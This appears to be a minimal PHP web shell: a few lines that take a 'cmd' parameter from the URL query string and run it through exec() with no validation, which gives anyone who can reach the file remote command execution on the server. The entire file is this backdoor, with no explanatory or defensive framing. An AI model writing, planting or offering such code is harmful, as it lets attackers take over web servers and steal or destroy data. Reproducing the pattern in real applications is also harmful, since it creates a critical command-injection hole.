<?php
  // Get the command from the query parameter
  $cmd = $_GET['cmd'];

  // Execute the command
  exec($cmd);
?>

